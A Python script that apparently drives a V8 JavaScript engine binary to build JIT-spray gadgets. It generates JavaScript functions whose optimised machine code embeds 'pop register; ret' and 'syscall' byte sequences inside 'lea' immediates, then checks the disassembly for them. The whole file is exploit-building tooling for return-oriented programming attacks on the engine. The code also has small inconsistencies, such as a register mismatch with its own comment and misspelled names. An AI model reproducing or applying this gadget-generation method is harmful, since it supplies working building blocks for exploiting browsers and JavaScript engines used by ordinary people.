import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
rs_set = {'rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx'}
exec_path = ''
count = 12

def get_registers(log:str):
    f = open(log, 'r')
    base = 110
    nums = []
    for i in range(base, base + count):
        nums.append('0x' + str(i))

    lines = f.readlines()
    mm = dict()
    for line in lines:
        if line.find('0xc3') != -1 and line.find(',[') != -1:
            dd = line.split()
            # print gadget line
            print(dd[2], ' '.join(dd[3:]))
        for num in nums:
            if line.find(num) != -1 and line[line.find(num) - 1] == ',':
                mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
                break
    return mm

def excute_js(js:str, filename:str)->bool:
    f = open(filename + '.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code ' + filename + '.js > ' + filename + '.txt')
    f = open(filename + '.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('lea') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    return True
    
    return False

def generate_template(count:int):
    header = '''
var array = new Uint8Array();
function syscall_jsc('''

    for i in range(count - 1):
        header += 'var' + str(i) + ', '
    header += 'var' + str(count - 1) + '){\n'
    base = 110
    middle1 = ''
    for i in range(count):
        var = 't' + str(i)
        middle1 += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
        base += 1
    

    jsc = '\t\tvar s = t' + str(0) + ' * 2 + t' + str(1) + ' + 0xc3;\n    return  '

    middle2 = ''
    for i in range(count - 1):
        middle2 += 't' + str(i) + ' ' + '+ '
    middle2 += 't' + str(count-1) + ' | s;\n}\n'

    tail = '''
for(var i = 0; i < 0x10000; i++)
{
'''
    tail += '\tsyscall_jsc('
    for i in range(count - 1):
        tail += '0xc' + str(i) + ', '
    tail += '0xc' + str(count - 1) + ');'
    tail += '\n}\n'

    excute_js(header + middle1 + jsc + middle2 + tail, 'test')

def gen_jsc(r1:str, r2:str):
    base = 110
    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 2 + 0xc3;\n'
    jsc += '\treturn '
    l = False
    for i in range(count):
        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
            if l:
                jsc += ' + '
            jsc += 't' + str(i)
            l = True
    jsc += ' | s;\n'
    return jsc

def gen_syscall(r1:str, r2:str):
    base = 110
    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 1 + 0x5;\n'
    jsc += '\treturn '
    l = False
    for i in range(count):
        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
            if l:
                jsc += ' + '
            jsc += 't' + str(i)
            l = True
    jsc += ' | s;\n'
    return jsc

def generate_js(filename:str):
    f = open(filename, 'r')
    lines = f.readlines()
    header = ''
    i = 0
    while i < len(lines):
        if lines[i].find('\tvar s') == -1:
            header += lines[i]
        else:
            i += 2
            break
        i += 1
    tail = ''
    while i < len(lines):
        tail += lines[i]
        i += 1

    base = 110
    # 428d945ac3000000 ;leal rdx,[rdx+r11*2+0xc3]
    # jsc5ac3 = '\tvar s = t' + str(int(rs_map['rdx']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
    jsc5ac3 = gen_jsc('rdx', 'r11')
    if not excute_js(header + jsc5ac3 + tail, '5ac3'):
        print('generate 5ac3 failed')
    # 8d8c5ec3000000 ;leal rcx,[rsi+rbx*2+0xc3]
    # jsc5ec3 = '\tvar s = t' + str(int(rs_map['rsi']) - base) + ' + t' + str(int(rs_map['rbx']) - base) + ' * 2 + 0xc3;\n'
    jsc5ec3 = gen_jsc('rsi', 'rbx')
    if not excute_js(header + jsc5ec3 + tail, '5ec3'):
        print('generate 5ec3 failed')
    # 428d8c5fc3000000 ;leal rcx,[rdi+r11*2+0xc3]
    # jsc5fc3 = '\tvar s = t' + str(int(rs_map['rdi']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n'
    jsc5fc3 = gen_jsc('rsi', 'r11')
    if not excute_js(header + jsc5fc3 + tail, '5fc3'):
        print('generate 5fc3 failed')
    # 438d8c58c3000000 ;leal rcx,[r8+r11*2+0xc3]
    # jsc58c3 = '\tvar s = t' + str(int(rs_map['r8']) - base) + ' + t' + str(int(rs_map['r11']) - base) + ' * 2 + 0xc3;\n' 
    jsc58c3 = gen_jsc('r8', 'r11')
    if not excute_js(header + jsc58c3 + tail, '58c3'):
        print('generate 58c3 failed')
    # 8d4c0f05   	;leal rcx,[rdi+rcx*1+0x5]
    # jsc0f05 = '\tvar s = t' + str(int(rs_map['rcx']) - base) + ' + t' + str(int(rs_map['rdi']) - base) + ' + 0x5;\n'
    jsc0f05 = gen_syscall('rcx', 'rdi')
    if not excute_js(header + jsc0f05 + tail, '0f05'):
        print('generate 0f05 failed')
    
    # out = open('jsc.js', 'w')
    # write jsc function


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()


    generate_template(count)
    rs_map = get_registers('test.txt')
    if not rs_set < set(rs_map.keys()):
        print('needed ', rs_set)
        print('has', set(rs_map.keys()))
        print('resgister are not enough')
        exit()
    print(rs_map)
    generate_js('test.js')
    print('done')
